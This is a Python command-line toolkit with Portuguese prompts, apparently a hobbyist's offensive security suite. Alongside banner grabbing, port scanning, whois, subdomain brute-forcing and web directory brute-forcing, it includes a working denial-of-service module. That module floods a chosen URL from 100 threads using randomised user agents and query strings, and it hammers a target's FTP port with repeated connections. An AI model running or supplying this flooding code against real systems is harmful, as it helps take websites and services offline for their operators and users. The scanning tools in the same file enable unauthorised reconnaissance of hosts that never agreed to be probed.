# #!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import random
import re
import string
import sys
import threading
import requests
import socket
import time
import signal
import dns.resolver

from urllib.parse import urlparse
from bs4 import BeautifulSoup

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
NC = '\033[0m' 
BLUE = '\033[0;34m'
CYAN = '\033[0;36m'
PURPLE = '\033[0;35m'


def traco():
    print("-" * 15)





def logo():
    logo = [
        "▒█████   ▄▄▄▄    ██▓     ██▓ ██▒   █▓ ██▓ ▒█████   ███▄    █ ",
        "▒██▒  ██▒▓█████▄ ▓██▒    ▓██▒▓██░   █▒▓██▒▒██▒  ██▒ ██ ▀█   █ ",
        "▒██░  ██▒▒██▒ ▄██▒██░    ▒██▒ ▓██  █▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒",
        "▒██   ██░▒██░█▀  ▒██░    ░██░  ▒██ █░░░██░▒██   ██░▓██▒  ▐▌██▒",
        "░ ████▓▒░░▓█  ▀█▓░██████▒░██░   ▒▀█░  ░██░░ ████▓▒░▒██░   ▓██░",
        "░ ▒░▒░▒░ ░▒▓███▀▒░ ▒░▓  ░░▓     ░ ▐░  ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ",
        "  ░ ▒ ▒░ ▒░▒   ░ ░ ░ ▒  ░ ▒ ░   ░ ░░   ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░",
        "░ ░ ░ ▒   ░    ░   ░ ░    ▒ ░     ░░   ▒ ░░ ░ ░ ▒     ░   ░ ░ ",
        "    ░ ░   ░          ░  ░ ░        ░   ░      ░ ░           ░ ",
        "               ░                  ░                            "
    ]

    for line in logo:
        print(RED + line + NC)

    frame_top = f"{YELLOW}==========================================================================================={NC}"
    frame_bottom = f"{YELLOW}==========================================================================================={NC}"

    print(frame_top)
    print(f"{PURPLE}                            [+] Coded by: Spectr0x {NC}")
    print(f"{PURPLE}                         https://github.com/AndreNunes7 {NC}")
    print(frame_bottom)

def logo_parsing():

    logo = [
    f"""
██████╗  █████╗ ██████╗ ███████╗██╗███╗   ██╗ ██████╗    ██╗  ██╗████████╗███╗   ███╗██╗     
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║████╗  ██║██╔════╝    ██║  ██║╚══██╔══╝████╗ ████║██║     
██████╔╝███████║██████╔╝███████╗██║██╔██╗ ██║██║  ███╗   ███████║   ██║   ██╔████╔██║██║     
██╔═══╝ ██╔══██║██╔══██╗╚════██║██║██║╚██╗██║██║   ██║   ██╔══██║   ██║   ██║╚██╔╝██║██║     
██║     ██║  ██║██║  ██║███████║██║██║ ╚████║╚██████╔╝   ██║  ██║   ██║   ██║ ╚═╝ ██║███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝    ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚══════╝
                                                                                 {YELLOW}By: Spectr0x{NC}       
    """
        
        
    ]


    for line in logo:
        print(RED + line + NC)
   
def logo_grabbing():
   
    logo = [
        f"""
██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝    ███████╗██║     ███████║██╔██╗ ██║
██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗    ╚════██║██║     ██╔══██║██║╚██╗██║
██████╔╝██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                                          
                                                                                {YELLOW}By: Spectr0x {NC}              
        """
    ]

    
    for line in logo:
        print(RED + line + NC)
    
def logo_DoS():
    
    
    
    logo = [
        f"""
██████╗  ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██║  ██║██║   ██║███████╗    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██║  ██║██║   ██║╚════██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██████╔╝╚██████╔╝███████║    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                    {YELLOW}By: Spectr0x{NC}
        """
        
    ]


    for line in logo:
        print(RED + line + NC)

def logo_PortScanner():  
   
    logo = [
        
        f"""
██████╗  ██████╗ ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝██║   ██║██████╔╝   ██║       ███████╗██║     ███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██╔══██╗   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
██║     ╚██████╔╝██║  ██║   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                            {YELLOW}By: Spectr0x{NC}             
        """
    ]
    
    

    for line in logo:
        print(RED + line + NC)

def logo_whois():
    
    logo = [
        " █████   ███   █████ █████                ███         ",
        "░░███   ░███  ░░███ ░░███                ░░░          ",
        " ░███   ░███   ░███  ░███████    ██████  ████   █████ ",
        " ░███   ░███   ░███  ░███░░███  ███░░███░░███  ███░░  ",
        " ░░███  █████  ███   ░███ ░███ ░███ ░███ ░███ ░░█████ ",
        "  ░░░█████░█████░    ░███ ░███ ░███ ░███ ░███  ░░░░███",
        "    ░░███ ░░███      ████ █████░░██████  █████ ██████ ",
        "     ░░░   ░░░      ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░░  ",
        f"                                      {YELLOW}By: Spectr0x{NC}      "
    ]

    for line in logo:
        print(RED + line + NC)
  
def logo_port_knocking():
   
    logo = [
        
        f"""
██████╗  ██████╗ ██████╗ ████████╗    ██╗  ██╗███╗   ██╗ ██████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██║ ██╔╝████╗  ██║██╔═══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ 
██████╔╝██║   ██║██████╔╝   ██║       █████╔╝ ██╔██╗ ██║██║   ██║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║   ██║██╔══██╗   ██║       ██╔═██╗ ██║╚██╗██║██║   ██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
██║     ╚██████╔╝██║  ██║   ██║       ██║  ██╗██║ ╚████║╚██████╔╝╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                         {YELLOW}By: Spectr0x {NC}       
        """
    ]


    for line in logo:
        print(RED + line + NC)
    
def logo_dns_scan():
    
    logo = [
        
        f"""
██████╗ ███╗   ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗████╗  ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██║  ██║██╔██╗ ██║███████╗    ███████╗██║     ███████║██╔██╗ ██║
██║  ██║██║╚██╗██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║
██████╔╝██║ ╚████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║
╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                   {YELLOW}By: Spectr0x{NC}         
        """
    ]

    
    for line in logo:
        print(RED + line + NC)
      
      
def logo_webRecon():
    
    logo = [
        f"""
██╗    ██╗███████╗██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝███████╗██████╔╝    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                             {YELLOW}By: Spectr0x{NC}          
        """
    ]
    
    for line in logo:
        print(RED + line + NC)



                           
 
# VALIDAÇOES:

def validate_option():
    while True:
        resp = input(f"{GREEN}>>>>> {NC}")
        if resp.isdigit() and resp in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
            return resp
        else:
            print(f"{RED}[-] Opção inválida!{NC}: Selecione um entre {PURPLE}1 a 4{NC} e digite apenas {PURPLE}números{NC}!") 
def format_url(user_input):
        user_input = user_input.strip()
        parsed_url = urlparse(user_input)
        
        if not parsed_url.netloc:
            user_input = f"http://{user_input}"
            parsed_url = urlparse(user_input)
        
        if not parsed_url.scheme:
            user_input = f"https://{user_input}"
        return user_input
def validaURL(url):
    try:
        response = requests.head(url, allow_redirects=True, timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False
    
     
     
     
# TOOLS:
def menu():
    print(f"{GREEN}[+]{NC} {YELLOW}Select an option: {NC}\n \n"
          f"{PURPLE}[1]{NC} - {YELLOW}Parsing HTML {NC}\n"
          f"{PURPLE}[2]{NC} - {YELLOW}Banner Grabbing {NC}\n"
          f"{PURPLE}[3]{NC} - {YELLOW}DoS {NC}\n"
          f"{PURPLE}[4] {NC}- {YELLOW}Port Scanning {NC}\n"
          f"{PURPLE}[5] {NC}- {YELLOW}Whois {NC}\n"
          f"{PURPLE}[6] {NC}- {YELLOW}Port Knocking {NC}\n"
          f"{PURPLE}[7] {NC}- {YELLOW}Dns Scan {NC}\n"
          f"{PURPLE}[8] {NC}- {YELLOW}WebRecon {NC}\n"
          f"{PURPLE}[9] {NC}- {YELLOW}Exit {NC}\n"
          
          )
     
              
def parsing_html():
    
    while True:
        print()
        url_user = input(f"{GREEN}[+]{NC} Digite uma URL: >>>> ")
        url = format_url(url_user)

        while not validaURL(url):
            print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
            url_user = input(f"{RED}[-]{NC} Digite uma URL válida: >>>> ")
            url = format_url(url_user)

        print(f"{YELLOW}{'=' * 72}{NC}")
        print(f"{GREEN}           [+] Resolvendo URLs em:{NC} {CYAN}{url}{NC}")
        print(f"{PURPLE}                  Desenvolvido by: Spectr0x {NC}")
        print(f"{YELLOW}{'=' * 72}{NC}")
        
        try:
            response = requests.get(url)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Erro ao processar a URL {url}")
            continue
        
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        domain_set = set()

        for link in links:
            parsed_url = urlparse(link['href'])
            domain = parsed_url.netloc
            if domain:
                domain_set.add(domain)

        with open('lista_urls', 'w') as file:
            for domain in domain_set:
                file.write(f'{domain}\n')

        if not os.path.exists('lista_urls'):
            print("Arquivo 'lista_urls' não encontrado")
            return

        with open('lista_urls', 'r') as file:
            for line in file:
                domain = line.strip()
                try:
                    ip = socket.gethostbyname(domain)
                    print(f"{GREEN}[+]{NC} Host {BLUE}{domain}{NC} tem o IP: {RED}{ip}{NC}")
                    time.sleep(1)
                    result_filename = f"resultado_{re.sub(r'[:/]', '', url)}.ip"
                    
                    with open(result_filename, 'a') as result_file:
                        result_file.write(f"{ip}\n")
                except socket.gaierror:
                    print(f"{RED}[-]{NC} ERRO ao resolver domínio {RED}{domain}{NC}")
                except Exception as e:
                    print(f"Erro desconhecido: {e}")

        print(f"{YELLOW}{'=' * 72}{NC}")
        print()
        perg = input("Consultar novamente? [S/N]: ").strip().lower()
        if perg not in ("s", "sim"):
            if perg in ("n", "não"):
                print("Finalizando...")
                time.sleep(1)
                os.system("cls")
                logo()
                tools()
            else:
                print("Opção inválida!")
                continue
            break
                  
def banner_grabbing():
    def validator():
        while True:
            ip = input(f"{GREEN}[+]{NC} Digite um IP: >>>> ")
            if not ip:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira o IP!!{NC}")
                continue
            try:
                socket.inet_aton(ip)
            except socket.error:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}IP inválido!!{NC}")
                continue
            
            porta = input(f"{GREEN}[+]{NC} Digite uma PORTA: >>>> ")
            if not porta:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira a PORTA!!{NC}")
                continue
            if not porta.isdigit() or not (0 <= int(porta) <= 65535):
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Porta inválida!!{NC}")
                continue
            
            return ip, int(porta)

    while True:
        print()

        ip, porta = validator()

        print(f"{YELLOW}{'=' * 72}{NC}")
        print(f'{GREEN}[+]{NC} {PURPLE}Escaneando...{NC}')
        print(f"{YELLOW}{'=' * 72}{NC}")
        time.sleep(1)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as meusocket:
                meusocket.settimeout(5)
                meusocket.connect((ip, porta))
                banner = meusocket.recv(1024)
                print(f"{GREEN}[+]{NC} Banner recebido de {BLUE}{ip}:{porta}{NC}: {CYAN}{banner.decode().strip()}{NC}")
        except socket.error as e:
            print(f"{RED}[-]{NC} Erro ao conectar ao IP {RED}{ip}{NC} na porta {RED}{porta}{NC}: {e}")
        
        print(f"{YELLOW}{'=' * 72}{NC}")
        print()
        perg = input("Consultar novamente? [S/N]: ").strip().lower()
        if perg not in ("s", "sim"):
            if perg in ("n", "não"):
                time.sleep(1)
                print("Finalizando...")
                os.system("cls" if os.name == 'nt' else 'clear')
                logo()
                tools()
            else:
                print("Opção inválida!")
                continue
            break
      
def dos_attack():
    def dos_web():
        keep_running = True
        
        def handle_sigint(sig, frame):
            nonlocal keep_running
            keep_running = False

        signal.signal(signal.SIGINT, handle_sigint)

        url = format_url(input(f"{GREEN}[+]{NC} Digite uma URL: >>>> "))

        while not validaURL(url):
            print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
            url = format_url(input(f"{RED}[-]{NC} Digite uma URL válida: >>>> "))

        print(f"{RED}====================================================================={NC}")
        print(f'{GREEN}                       [+]{NC} {PURPLE}Attacking...{NC}')
        print(f"{RED}====================================================================={NC}")
        time.sleep(1)

        def random_user_agent():
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
            ]
            return random.choice(user_agents)

        def random_query_string(length=10):
            letters = string.ascii_lowercase
            return ''.join(random.choice(letters) for i in range(length))

        def dos_attack_web(url):
            while keep_running:
                try:
                    headers = {'User-Agent': random_user_agent()}
                    params = {'q': random_query_string()}
                    response = requests.get(url, headers=headers, params=params)
                    print(f'{GREEN}[+]{NC} {PURPLE}Attacking send: {response.status_code} - {response.reason}{NC}')
                    time.sleep(random.uniform(0.1, 1.0))
                except requests.RequestException:
                    print(f"{RED}[-]{NC} Connection failed")
                    break
                except KeyboardInterrupt:
                    break

        num_threads = 100
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=dos_attack_web, args=(url,))
            t.start()
            threads.append(t)
            time.sleep(0.1)

        for t in threads:
            t.join()

        print(f"{RED}[-]{NC} Exiting...")

    def dos_ftp():
        keep_running = True

        def handle_sigint(sig, frame):
            nonlocal keep_running
            keep_running = False

        signal.signal(signal.SIGINT, handle_sigint)

        ip = input(f"{GREEN}[+]{NC} Digite o IP: >>>> ")
        
        while True:
            if not ip:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira o IP!!{NC}")
                ip = input(f"{GREEN}[+]{NC} Digite o IP: >>>> ")
                continue
            try:
                socket.inet_aton(ip)
                break
            except socket.error:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}IP inválido!!{NC}")
                ip = input(f"{GREEN}[+]{NC} Digite o IP: >>>> ")
        
        print(f"{RED}====================================================================={NC}")
        print(f'{GREEN}                       [+]{NC} {PURPLE}Attacking...{NC}')
        print(f"{RED}====================================================================={NC}")
        time.sleep(1)

        while keep_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    s.connect((ip, 21))
                    local_addr = s.getsockname()
                    remote_addr = s.getpeername()
                    print(f'{GREEN}[+]{NC} {PURPLE}Attacking service: {local_addr[0]}:{local_addr[1]} -> {remote_addr[0]}:{remote_addr[1]}{NC}')
                    time.sleep(1)
            except (socket.timeout, socket.error):
                time.sleep(1)
                print(f"{RED}[-]{NC} Connection failed")
                print(f"{RED}---------------------------------------------------------------------{NC}")
                break
            except KeyboardInterrupt:
                break

        print(f"{RED}[-]{NC} Exiting...")

    def dos_options():
        print(f"{GREEN}[+]{NC} {YELLOW}Select a service: {NC}\n\n"
              f"{PURPLE}[1]{NC} - {YELLOW}HTTP {NC}\n"
              f"{PURPLE}[2]{NC} - {YELLOW}FTP {NC}\n")
        print()
        while True:
            try:
                resp = input(f"{GREEN}>>>>> {NC}")
                if resp == "1":
                    dos_web()
                    break
                elif resp == "2":
                    dos_ftp()
                    break
                else:
                    print(f"{RED}[-] Opção inválida! Selecione uma entre 1 ou 2.{NC}")
            except KeyboardInterrupt:
                print(f"{RED}[-]{NC} Exiting...")
                break

    dos_options()

def port_scanner():
    def resolve_hostname(url):
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc or parsed_url.path
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            print(f"{RED}Não foi possível resolver o hostname {hostname}{NC}")
            return None

    def scan_port(ip, porta):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as meusocket:
                meusocket.settimeout(1)
                if meusocket.connect_ex((ip, porta)) == 0:
                    print(f"{GREEN}[+]{NC} Porta {RED}{porta}{NC} {GREEN}[ABERTA]{NC}")
        except socket.error:
            pass

    url = format_url(input(f"{GREEN}[+]{NC} Digite uma URL: >>>> "))

    while not validaURL(url):
        print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
        url = format_url(input(f"{RED}[-]{NC} Digite uma URL válida: >>>> "))

    resolved_ip = resolve_hostname(url)
    if resolved_ip:
        print(f"{YELLOW}={NC}" * 65)
        print(f"{GREEN}[+]{NC} Iniciando varredura de {PURPLE}portas{NC} para {PURPLE}{resolved_ip}{NC}")
        print(f"{YELLOW}={NC}" * 65)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(lambda p: scan_port(resolved_ip, p), range(1, 65536))

def whois():
    def extract_domain(url):
        parsed_url = urlparse(url)
        return parsed_url.netloc

    def whois_query(domain):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(("whois.iana.org", 43))
                s.send((domain + "\r\n").encode('utf-8'))
                response = s.recv(1024).split()

            if len(response) > 19:
                whois_server = response[19].decode('utf-8')
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s1:
                    s1.connect((whois_server, 43))
                    s1.send((domain + "\r\n").encode('utf-8'))
                    resp = s1.recv(4096).decode('iso-8859-1')
                
                for line in resp.splitlines():
                    if not line.startswith('%'):
                        print(line)
                    if line.startswith('>>>'):
                        break

        except socket.error as e:
            print(f"Erro ao conectar ao servidor WHOIS: {e}")

    print()
    url = format_url(input(f"{GREEN}[+]{NC} Digite uma URL: >>>> "))
    while not validaURL(url):
        print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
        url = format_url(input(f"{RED}[-]{NC} Digite uma URL válida: >>>> "))

    domain = extract_domain(url)
    whois_query(domain)

def port_knocking():
    keep_running = True

    # def handle_sigint(sig, frame):
    #     try:
    #         nonlocal keep_running
    #         keep_running = False
            
    #         print(f"\n{RED}[!] Execução interrompida pelo usuário.{NC}")
    #     except KeyboardInterrupt:
    #         raise

    def validator():
        while True:
            ip = input(f"{GREEN}[+]{NC} Digite o {PURPLE}IP{NC} ou {PURPLE}rede{NC} {PURPLE}(ex: 192.168.1):{NC} {GREEN}>>>>{NC} ")
            if not ip:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira o IP!!{NC}")
                continue
            try:
                socket.inet_aton(ip)
                return ip
            except socket.error:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}IP inválido!!{NC}")

    def knock_port(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((ip, port))
                return port if result == 0 else None
        except socket.error:
            return None

    # signal.signal(signal.SIGINT, handle_sigint)
    ip_prefix = validator()

    
    ports = input(f"{GREEN}[+]{NC} Digite a sequência de portas (separadas por vírgulas, ex: 80,21,22,443): >>>> ")
    ports = [int(port.strip()) for port in ports.split(',')]

    print(f"{RED}====================================================================={NC}")
    print(f'{GREEN}                       [+]{NC} {PURPLE}Iniciando o Port Knocking...{NC}')
    print(f"{GREEN}                           [!]{NC} Coded by: {PURPLE}Spectr0x {NC}")    
    print(f"{RED}====================================================================={NC}")
    time.sleep(1)

    successful_knocks = {}

    with ThreadPoolExecutor(max_workers=100) as executor:
        for i in range(1, 255):
            if not keep_running:
                break
            current_ip = f"{ip_prefix}.{i}"
           
            
            
            futures = {executor.submit(knock_port, current_ip, port): port for port in ports}

            
            for future in as_completed(futures):
                if not keep_running:
                    break
                port = futures[future]
                if future.result() is not None:
                    if current_ip not in successful_knocks:
                        successful_knocks[current_ip] = set()
                    successful_knocks[current_ip].add(port)
            
            
            if current_ip in successful_knocks:
                ports_str = ', '.join(map(str, sorted(successful_knocks[current_ip])))
                print(f"{GREEN}[+] {NC}IP: {RED}{current_ip}{NC} - Portas: {GREEN}{ports_str}{NC}")

  
    while True:
        if not keep_running:
            print(f"\n{RED}Execução interrompida antes de completar.{NC}")
            break
        elif successful_knocks:
            print(f"\n{GREEN}Port Knocking bem-sucedido em:{NC}")
            for ip, ports in successful_knocks.items():
                ports_str = ', '.join(map(str, sorted(ports)))
                print(f"{GREEN}[+] {NC}IP: {RED}{ip}{NC} - Portas: {GREEN}{ports_str}{NC}")
        else:
            print(f"{RED}Nenhum port knocking bem-sucedido encontrado.{NC}")
            break

def dns_scan():
    def validator():
        while True:
            print()
            domain = input(f"{GREEN}[+]{NC} Digite um {GREEN}domínio{NC}: {PURPLE}>>>>{NC} ").strip()
            print(f"{YELLOW}={NC}" * 53)
            if not domain:
                print(f"{RED}[-] ERRO!!{NC} {GREEN}Insira um domínio!!{NC}")
                continue
            try:
                socket.gethostbyname(domain)
                return domain
            except socket.gaierror:
                print(f"{RED}[-] ERRO!!{NC} {GREEN}Domínio inválido!!{NC}")

    def dns_lookup(subdomain): 
        try:
            dns.resolver.resolve(subdomain, 'A')
            return subdomain
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            return None
        except dns.name.EmptyLabel:
            print(f"{RED}[-] ERRO!!{NC} {GREEN}Nome de domínio inválido: {subdomain}{NC}")
            return None

    def read_wordlist(filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{RED}[-] {NC}Arquivo {filename} não encontrado.")
            return None
        except Exception as e:
            print(f"{RED}[-] {NC}Erro ao ler o arquivo: {e}")
            return None

    domain = validator()
    wordlist = read_wordlist('common.txt')
    
    if wordlist is None:
        return

    found_subdomains = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for word in wordlist:
            subdomain = f"{word}.{domain}"
            if not subdomain or subdomain.startswith('.') or subdomain.endswith('.'):
                continue
            futures.append(executor.submit(dns_lookup, subdomain))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                found_subdomains.append(result)
                print(f"{GREEN}[+] {NC}Sub-Domínio encontrado: {RED}{result}{NC}")

    if not found_subdomains:
        print(f"{RED}[-] {NC}Nenhum sub-domínio encontrado.")

def WebRecon():
    def check_url(base_url, palavra, extensoes):
        urls = []
        if extensoes:
            for ext in extensoes:
                urls.append(f'{base_url}/{palavra}.{ext}')
        else:
            urls.append(f'{base_url}/{palavra}/')

        user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        
        
        for url in urls:
            try:
                response = requests.get(url, headers=user_agent, timeout=5)
                if response.status_code == 200:
                    tipo = "Arquivo" if extensoes else "Diretório"
                    mensagem = f"{GREEN}[+] {NC}URL encontrada: {RED}{url}{NC}"
                    return mensagem, tipo
            except requests.RequestException:
                pass
        return None
    def get_base_url():
        while True:
            base_url = input(f"{GREEN}[+]{NC} Digite a {PURPLE}URL{NC} (exemplo: {PURPLE}exemplo.com{NC}): ").strip().lower()
            
           
            base_url = re.sub(r'^https?://', '', base_url)
            
            base_url = re.sub(r'^www\.', '', base_url)
            
            if not re.search(r'\.', base_url):
                print(f"{RED}[-] URL inválida. Inclua o domínio completo (exemplo: {PURPLE}exemplo.com{NC}).")
                continue
            
            
            try:
                response = requests.head(f"https://{base_url}", timeout=5)
                if response.status_code < 400:
                    return f"https://{base_url}"
            except requests.RequestException:
                pass
            
            try:
                response = requests.head(f"http://{base_url}", timeout=5)
                if response.status_code < 400:
                    return f"http://{base_url}"
            except requests.RequestException:
                print(f"{RED}[-] Não foi possível conectar a URL. Verifique se o domínio está correto.")
                continue
            
            print(f"{RED}[-] Não foi possível acessar a URL. Verifique se o domínio está correto.")

   
    # base_url = input(f"{GREEN}[+]{NC} Digite a url: ").rstrip('/')
    base_url = get_base_url()
   
    extensoes = input(f"{GREEN}[+]{NC} Digite as {PURPLE}extensões{NC} separadas por {PURPLE}espaços{NC} (pressione Enter para buscar por diretórios): ").split()

    if not extensoes:
        print(f"{GREEN}[+]{NC} Buscando por {GREEN}diretórios...{NC}")
    else:
        print(f'{GREEN}[+]{NC} Buscando por arquivos com extensões: {RED}{", ".join(extensoes)}{NC}')

    try:
        with open('common.txt', 'r') as file:
            palavras = [linha.strip() for linha in file]
    except FileNotFoundError:
        print(f"{RED}[-] {NC}Arquivo 'common.txt' não encontrado.")
        return
    
    print(f"{YELLOW}={NC}" * 70)
    print(f"\n{RED}[!]{NC} Iniciando a varredura em {GREEN}{base_url}{NC}")
    print(f"{RED}[!]{NC} Total de palavras a serem testadas: {GREEN}{len(palavras)}{NC}")
    print(f"{RED}[!]{NC} Iniciando busca... Isto pode levar algum tempo.\n")
    

    encontrados = 0

    print(f"{YELLOW}={NC}" * 70)
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(check_url, base_url, palavra, extensoes) for palavra in palavras]
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                url, tipo = result
                print(url)
                encontrados += 1
    
    print(f"{YELLOW}={NC}" * 70)
    print(f"\n{GREEN}Varredura concluída. Total de itens encontrados: {encontrados}{NC}")

# MAIN PROGRAM


def tools():
    menu()
    option = validate_option()
    if option == "1":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_parsing()
        parsing_html()
    elif option == "2":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_grabbing()
        banner_grabbing()
    elif option == "3":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_DoS()
        dos_attack()
    elif option == "4":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_PortScanner()
        port_scanner()

    elif option == "5":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_whois()
        whois()
    elif option == "6":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_port_knocking()
        port_knocking()
    elif option == "7":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_dns_scan()
        dns_scan()
        
    elif option == "8":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_webRecon()
        WebRecon()
    elif option == "9":
        print(f"{RED}[-]{NC} Encerrando....")
        time.sleep(1)
        os.abort()
       

if __name__ == "__main__":
    logo()
    tools()
